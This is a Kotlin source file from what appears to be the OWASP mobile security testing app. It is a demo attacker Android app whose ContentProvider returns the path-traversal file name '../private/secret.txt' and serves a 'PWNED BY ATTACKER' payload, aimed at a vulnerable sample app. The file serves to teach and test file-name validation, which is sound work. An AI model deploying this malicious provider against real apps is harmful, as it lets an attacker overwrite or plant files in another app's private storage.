package org.owasp.mastestapp

import android.app.Activity
import android.content.ContentProvider
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.Bundle
import android.os.ParcelFileDescriptor
import android.view.Gravity
import android.widget.TextView
import java.io.File
import java.io.FileNotFoundException

// SUMMARY: This sample demonstrates an attacker app that returns a path-traversal filename via a ContentProvider.
class MastgTest(private val context: Context) {

    fun mastgTest(): String {
        val r = DemoResults("0x06")
        r.add(Status.FAIL, "This app should be invoked by an implicit intents from MASTG-DEMO-0139")
        return r.toJson()
    }
}

class AttackerActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val action = intent.action
        if (action == Intent.ACTION_MAIN) {
            val textView = TextView(this).apply {
                text = "Hello in the attacker Demo app"
                textSize = 20f
                gravity = Gravity.CENTER
                setTextColor(android.graphics.Color.BLACK)
            }
            setContentView(textView)
        } else {
            val resultIntent = Intent()
            resultIntent.data = Uri.parse("content://org.owasp.mastestapp.attacker.provider/fakeFile")
            resultIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            setResult(Activity.RESULT_OK, resultIntent)
            finish()
        }
    }
}

class AttackerContentProvider : ContentProvider() {

    override fun onCreate(): Boolean = true

    override fun query(
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?
    ): Cursor {
        val matrixCursor = MatrixCursor(arrayOf("_display_name"))
        matrixCursor.addRow(arrayOf<Any>("../private/secret.txt"))
        return matrixCursor
    }

    @Throws(FileNotFoundException::class)
    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
        val cacheFile = File(context!!.cacheDir, "payload.txt")
        cacheFile.writeText("PWNED BY ATTACKER")
        return ParcelFileDescriptor.open(cacheFile, ParcelFileDescriptor.MODE_READ_ONLY)
    }

    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?): Int = 0
}
